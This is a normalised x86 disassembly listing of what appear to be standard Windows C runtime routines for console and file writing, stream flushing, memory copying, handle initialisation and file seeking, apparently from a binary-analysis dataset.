and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_40d7df
mov [ eax ] esi
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40b762
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_40d7df
xor esi esi
mov [ eax ] esi
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4119bd
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4117d6
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_40e99d
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x1c
call sub_40d7df
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_40d7f2
pop ecx
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_4139bf
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_4170d7
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_417398
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_417398
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_4170d7
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_40f420
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40eced
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f4f2
mov eax [ ebp - 0x1c ]
sub_40f4fc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_40f52e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40f4fc
pop ecx
push eax
call sub_40f420
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40f596
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40f52e
pop ecx
test eax eax
je r-xdata
push esi
call sub_40f5de
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40f4fc
push eax
call sub_4178e0
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40f5de
push 0x14
push r--data
call sub_40e30c
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f6af
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rwxdata ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_40e351
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rwxdata ]
jge r-xdata
push eax
push esi
call sub_40de6c
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40f680
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40f596
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40f596
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40f6b8
push 0xc
push r--data
call sub_40e30c
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_40f596
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f701
mov eax [ ebp - 0x1c ]
push esi
call sub_40f5de
pop ecx
jmp r-xdata
call sub_40e351
retn
sub_40f720
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40f7a8 ]
jmp [ ecx * 4 + jump_table_40f828 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f894 ]
pop esi
pop edi
pop ebp
jmp sub_417a48
jmp [ ecx * 4 + jump_table_40fa30 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40f934 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa30 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40f894 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40fa30 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f894 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f894 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f894 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa30 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa30 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa30 ]
sub_40fa85
push 0x54
push r--data
call sub_40e30c
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_41348c
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rwxdata ] eax
mov [ rwxdata ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rwxdata ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rwxdata ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rwxdata ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rwxdata ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_41348c
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_40e351
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rwxdata ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rwxdata ]
mov [ ecx ] eax
add [ rwxdata ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_416de7
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rwxdata ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_416de7
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_40fcd9
mov edi edi
push esi
push edi
mov esi rwxdata
add esi 0x4
cmp esi rwxdata
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_40fe78
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_40fd27
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_4174f2
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_40d7f2
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_40fd9c
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fd27
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fe6e
mov eax [ ebp - 0x1c ]
sub_40fe78
push 0xc
push r--data
call sub_40e30c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40e351
retn
cmp [ rwxdata ] 0x3
jne r-xdata
push esi
push 0x4
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_417ce5
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_40d7cc
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d78a
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fece
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
